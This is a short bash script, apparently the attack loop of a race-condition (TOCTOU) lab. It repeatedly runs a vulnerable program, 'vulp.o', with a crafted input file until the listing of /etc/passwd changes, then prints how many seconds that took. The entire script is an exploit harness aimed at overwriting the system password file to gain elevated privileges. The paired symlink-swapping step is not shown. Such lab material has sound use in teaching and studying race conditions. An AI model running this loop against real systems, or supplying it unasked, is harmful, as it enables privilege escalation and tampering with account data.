#!/bin/bash
SECONDS=0
CHECK_FILE="ls -l /etc/passwd"
old=$($CHECK_FILE)
new=$($CHECK_FILE)
while [ "$old" == "$new" ]
do
	./vulp.o < passwd_input
	new=$($CHECK_FILE)
done
echo "STOP... The passwd file has been changed after $SECONDS secs"
